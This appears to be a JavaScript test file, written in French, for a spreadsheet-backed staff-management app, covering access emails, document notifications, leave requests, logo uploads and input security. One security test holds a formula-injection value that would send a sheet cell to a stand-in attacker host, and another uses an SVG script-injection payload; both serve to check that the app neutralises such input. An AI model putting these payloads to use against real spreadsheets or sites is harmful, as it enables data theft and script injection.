const test = require('node:test');
const assert = require('node:assert');
const { loadApp } = require('./load');

const app = loadApp();
const { call, run, env } = app;
const ok = (r) => { assert.strictEqual(r.ok, true, JSON.stringify(r)); return r.data; };
const fail = (r, msg) => { assert.strictEqual(r.ok, false, 'devait échouer'); if (msg) assert.match(r.error, msg); };
const T = {};

test('envoi des accès d\'un agent par e-mail', () => {
  run("Setup.install('admin@t.fr', 'adminpw12', 'Admin')");
  run("Params.set({ prestataire_nom: 'SARL TEST' })");
  T.admin = ok(call(null, 'login', 'admin@t.fr', 'adminpw12')).token;
  const c = ok(call(T.admin, 'agentCreate', { nom: 'FARID OUALI', email: 'farid@t.fr', role: 'agent', password: 'initial123' }));
  T.id = c.agent.id;
  env.mails.length = 0;
  // à la création : le mot de passe créé est réutilisé
  let r = ok(call(T.admin, 'agentEnvoyerAcces', T.id, 'initial123'));
  assert.strictEqual(r.nouveau, false); assert.strictEqual(r.to, 'farid@t.fr');
  assert.ok(env.mails.some((m) => m.to === 'farid@t.fr' && /Identifiant : farid@t\.fr/.test(m.body) && /Mot de passe provisoire : initial123/.test(m.body) && /SARL TEST/.test(m.subject)));
  ok(call(null, 'login', 'farid@t.fr', 'initial123'));
  // plus tard : nouveau mot de passe provisoire généré, l'ancien ne marche plus
  env.mails.length = 0;
  r = ok(call(T.admin, 'agentEnvoyerAcces', T.id));
  assert.strictEqual(r.nouveau, true); assert.ok(r.password.length >= 8);
  assert.ok(env.mails[0].body.includes(r.password));
  fail(call(null, 'login', 'farid@t.fr', 'initial123'), /incorrect/);
  ok(call(null, 'login', 'farid@t.fr', r.password));
  // un faux mot de passe transmis n'est pas repris : un nouveau est généré
  r = ok(call(T.admin, 'agentEnvoyerAcces', T.id, 'faux-mot-de-passe'));
  assert.strictEqual(r.nouveau, true);
});

test('envoi refusé : agent introuvable, désactivé, ou non autorisé', () => {
  fail(call(T.admin, 'agentEnvoyerAcces', 'A-inconnu'), /introuvable/);
  const o = ok(call(T.admin, 'agentCreate', { nom: 'Autre Agent', email: 'autre@t.fr', role: 'agent', password: 'autrepw12' }));
  const agent = ok(call(null, 'login', 'autre@t.fr', 'autrepw12')).token;
  fail(call(agent, 'agentEnvoyerAcces', T.id), /(accès|réservé|autoris)/i);
  ok(call(T.admin, 'agentUpdate', o.agent.id, { actif: false }));
  fail(call(T.admin, 'agentEnvoyerAcces', o.agent.id), /désactivé/);
});

test('pastilles : documents déposés pour l\'agent, e-mail de notification', () => {
  ok(call(T.admin, 'agentCreate', { nom: 'DOC AGENT', email: 'doc@t.fr', role: 'agent', password: 'docpass12' }));
  const ag = ok(call(null, 'login', 'doc@t.fr', 'docpass12')).token;
  const me = ok(call(ag, 'me')).user;
  assert.strictEqual(ok(call(ag, 'badges')).documents.length, 0);
  env.mails.length = 0;
  ok(call(T.admin, 'documentUpload', { agent_id: me.id, type: 'ats', nom: 'ATS_test.pdf', base64: Buffer.from('%PDF-1.4 test').toString('base64') }));
  assert.ok(env.mails.some((m) => m.to === 'doc@t.fr' && /Nouveau document/.test(m.subject) && /ATS/.test(m.subject)), 'l\'agent est prévenu par e-mail');
  const b = ok(call(ag, 'badges'));
  assert.strictEqual(b.documents.length, 1); assert.match(b.documents[0].nom, /ATS/); assert.ok(b.now);
  assert.strictEqual(b.demandes, 0);
  // « nouveau » est conservé côté serveur jusqu'à ce que l'agent ouvre ses documents
  assert.strictEqual(ok(call(ag, 'badges')).documents.length, 1, 'toujours nouveau tant que l\'agent n\'a pas ouvert la liste');
  assert.strictEqual(ok(call(ag, 'documentsList')).filter((d) => d.nouveau === '1').length, 1);
  assert.strictEqual(ok(call(ag, 'documentsLus')).lus, 1);
  assert.strictEqual(ok(call(ag, 'badges')).documents.length, 0);
  // dépôt pour un agent sans adresse valide : le dépôt réussit, la raison de l'e-mail manquant est donnée
  const sans = ok(call(T.admin, 'agentCreate', { nom: 'SANS MAIL', email: 'sansmail@t.fr', role: 'agent', password: 'sansmail12' })).agent;
  assert.strictEqual(ok(call(T.admin, 'documentUpload', { agent_id: sans.id, type: 'ats', nom: 'ATS_x.pdf', base64: Buffer.from('%PDF-1.4 y').toString('base64') })).mail.ok, true);
  env.mailFail = true;
  const echec = ok(call(T.admin, 'documentUpload', { agent_id: sans.id, type: 'ats', nom: 'ATS_z.pdf', base64: Buffer.from('%PDF-1.4 z').toString('base64') }));
  assert.deepStrictEqual([echec.mail.ok, echec.mail.raison], [false, 'quota'], 'e-mail refusé par Google : le dépôt réussit et la raison est rapportée');
  env.mailFail = false;
});

test('titre de congé : date de reprise = départ + durée du repos, dans l\'e-mail et la liste', () => {
  ok(call(T.admin, 'agentCreate', { nom: 'REP AGENT', email: 'rep@t.fr', role: 'agent', password: 'reppass12' }));
  const ag = ok(call(null, 'login', 'rep@t.fr', 'reppass12')).token;
  env.mails.length = 0;
  ok(call(ag, 'demandeCreate', { type: 'titre_conge', date_debut: '2026-10-16', message: '' }));
  const m = env.mails.find((x) => /Nouvelle demande/.test(x.subject));
  assert.ok(m, 'chef / admin prévenu');
  assert.match(m.body, /Du 16\/10\/2026/); assert.match(m.body, /Reprise du travail prévue le 13\/11\/2026/, '16/10 + 28 jours de repos');
  ok(call(ag, 'demandeCreate', { type: 'titre_conge', date_debut: '2026-10-16', date_fin: '2026-11-05', message: '' }));
  assert.ok(env.mails.some((x) => /Reprise du travail prévue le 06\/11\/2026/.test(x.body)), 'avec une date de fin : fin + 1 jour');
  const l = ok(call(T.admin, 'demandesList'));
  assert.ok(JSON.stringify(l).includes('"reprise":"2026-11-13"'));
});

test('demande en attente : modification par l\'agent ; refus une fois transmise', () => {
  const ag = ok(call(null, 'login', 'rep@t.fr', 'reppass12')).token;
  const mine = ok(call(ag, 'demandesList')).mine;
  const d = mine[mine.length - 1];
  const r = ok(call(ag, 'demandeModifier', d.id, { date_debut: '2026-10-20', date_fin: '', message: 'date corrigée' }));
  assert.strictEqual(r.date_debut, '2026-10-20'); assert.strictEqual(r.message, 'date corrigée');
  assert.strictEqual(r.reprise, '2026-11-17', 'reprise recalculée : 20/10 + 28 jours');
  fail(call(ag, 'demandeModifier', d.id, { date_debut: '2026-10-20', date_fin: '2026-10-01' }), /précède/);
  fail(call(ag, 'demandeModifier', d.id, { type: 'inconnu' }), /Type/);
  ok(call(T.admin, 'demandesEnvoyer', [d.id], ''));
  fail(call(ag, 'demandeModifier', d.id, { message: 'trop tard' }), /déjà transmise/);
});

test('logos : import d\'une image, aperçu, remplacement, retrait, refus des formats invalides', () => {
  const png = Buffer.from('89504e470d0a1a0a', 'hex').toString('base64');
  fail(call(T.admin, 'logoUpload', { qui: 'prestataire', mime: 'application/pdf', base64: png }), /Format/);
  fail(call(T.admin, 'logoUpload', { qui: 'autre', mime: 'image/png', base64: png }), /inconnu/);
  const a = ok(call(T.admin, 'logoUpload', { qui: 'prestataire', mime: 'image/png', base64: png }));
  assert.ok(a.apercu.startsWith('data:image/png;base64,'));
  assert.strictEqual(ok(call(T.admin, 'setupGet')).values.logo_prestataire_id, a.id);
  assert.strictEqual(ok(call(T.admin, 'logoView', 'prestataire')).apercu, a.apercu);
  const b = ok(call(T.admin, 'logoUpload', { qui: 'prestataire', mime: 'image/png', base64: png }));
  assert.notStrictEqual(b.id, a.id); assert.strictEqual(env.files[a.id].trashed, true, 'ancien logo mis à la corbeille');
  ok(call(T.admin, 'logoRemove', 'prestataire'));
  assert.strictEqual(ok(call(T.admin, 'logoView', 'prestataire')).apercu, '');
  const ag = ok(call(null, 'login', 'rep@t.fr', 'reppass12')).token;
  assert.strictEqual(call(ag, 'logoUpload', { qui: 'client', mime: 'image/png', base64: png }).ok, false, 'réservé au Setup');
});

test('sécurité : un texte saisi commençant par = + - @ n\'est jamais une formule ; listes d\'agents triées', () => {
  const evil = '=IMPORTDATA("https://pirate.example/?x="&Agents!H2)';
  env.formulaCells.length = 0;
  const c = ok(call(T.admin, 'agentCreate', { nom: evil, email: 'evil@t.fr', role: 'agent', password: 'evilpass12' }));
  ok(call(T.admin, 'agentCreate', { nom: '+213 555 12 34', email: 'tel@t.fr', role: 'agent', password: 'telpass12' }));
  assert.deepStrictEqual(env.formulaCells, [], 'aucune cellule interprétée comme formule');
  const lu = ok(call(T.admin, 'agentsManage')).find((a) => a.id === c.agent.id);
  assert.strictEqual(lu.nom, evil, 'relu tel que saisi, sans apostrophe');
  const noms = ok(call(T.admin, 'agentsManage')).map((a) => a.nom);
  assert.deepStrictEqual(noms, [...noms].sort((a, b) => a.localeCompare(b, 'fr', { sensitivity: 'base' })), 'ordre alphabétique');
  const ag = ok(call(null, 'login', 'evil@t.fr', 'evilpass12')).token;
  for (let i = 0; i < 20; i += 1) ok(call(ag, 'demandeCreate', { type: 'attestation_cnas', message: '=1+1' }));
  fail(call(ag, 'demandeCreate', { type: 'attestation_cnas' }), /Trop de demandes/);
  assert.deepStrictEqual(env.formulaCells, []);
});
test('logo : le contenu doit correspondre au format annoncé', () => {
  fail(call(T.admin, 'logoUpload', { qui: 'client', mime: 'image/png', base64: Buffer.from('<svg onload=alert(1)>').toString('base64') }), /image valide/);
});
